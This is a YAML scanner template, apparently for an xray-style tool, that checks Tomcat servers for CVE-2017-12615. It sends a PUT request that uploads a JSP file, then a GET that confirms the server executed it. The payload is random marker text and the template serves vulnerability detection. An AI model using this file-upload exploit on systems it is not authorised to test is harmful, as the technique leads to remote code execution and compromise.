detail:
  author: j4ckzh0u(https://github.com/j4ckzh0u)
  links:
  - https://www.seebug.org/vuldb/ssvid-96562
  - https://mp.weixin.qq.com/s/sulJSg0Ru138oASiI5cYAA
expression: r0() && r1()
manual: true
name: poc-yaml-tomcat-cve-2017-12615-rce
rules:
  r0:
    expression: response.status == 201
    request:
      body: '{{verifyStr}} <%-- {{commentStr}} --%>'
      cache: true
      follow_redirects: false
      method: PUT
      path: /{{filename}}.jsp/
  r1:
    expression: response.status == 200 && response.body.bcontains(bytes(verifyStr))
      && !response.body.bcontains(bytes(commentStr))
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /{{filename}}.jsp
set:
  commentStr: randomLowercase(12)
  filename: randomLowercase(6)
  verifyStr: randomLowercase(12)
transport: http
